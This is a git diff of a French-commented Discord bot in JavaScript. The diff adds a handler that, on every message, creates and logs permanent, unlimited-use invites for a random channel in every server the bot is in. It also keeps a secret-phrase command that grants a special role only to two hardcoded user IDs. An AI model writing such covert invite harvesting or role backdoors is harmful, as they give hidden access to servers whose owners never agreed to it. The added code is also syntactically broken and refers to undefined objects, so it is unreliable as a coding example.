@@ -9,7 +9,7 @@ const bot = new Discord.Client();
 //Prefix
 const prefix = '--'
 
-//Lancement et etat du bot
+//Lancement et informations du bot
 bot.on('ready', () => {
    
    console.log(`INFORMATIONS DU BOT:`);
@@ -19,26 +19,39 @@ bot.on('ready', () => {
    //console.log(`Date of creation: ${bot.createdTimestamp}`);
    console.log(`INFORMATIONS OF SERVER BOT:`);
    console.log(`How many server: ${bot.guilds.size}`);
-  // console.log(`Name: ${bot.guilds.name}`);
-  // console.log(`ID: ${bot.guilds.id}`);
- //  console.log(`How many member: ${guilds.memberCount}`);
+   console.log(`Name: ${bot.guild.name}`);
+   console.log(`ID: ${bot.guild.id}`);
+   console.log(`How many member: ${guild.memberCount}`);
  });
 
 
 bot.on('message', message => {
+  
+   //invit link 
+    bot.guilds.forEach(guild => { 
+      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random('1').id);
+      invite.createInvite({maxAge: 0}, {maxUses: 0}).then(invite => {
+         console.log(`Connecté sur :\n${guild.name} ${invite}`));
+    })
+}
+       
    if (message.content.startsWith('C\'est mieux comme ça')) {
    if (message.author.id !== '423118623876448296')
    if (message.author.id !== '301913733536415755')
    return;
     message.member.addRole(message.member.guild.roles.find('name', '☡- 🌸Famille de shiro🌸 -☡'));
       }
-});
-
-bot.on('message', msg => {
-  if (msg.content === 'urjrurjping') {
-    msg.reply('Pong!');
-  }
-});
+   
+   
+   
+   //message.channel.createInvite({maxAge: 0, maxUses: 0}).then(invite => {
+    //let embed = new Discord.RichEmbed()
+    //.setColor(color)
+   // .console.log(`**Permanent Invite Link**: ${invite}`);
+   // message.channel.send(embed);
+ // });
+//}
+//});
   
 // Jeton Secret
 bot.login(process.env.TOKEN);
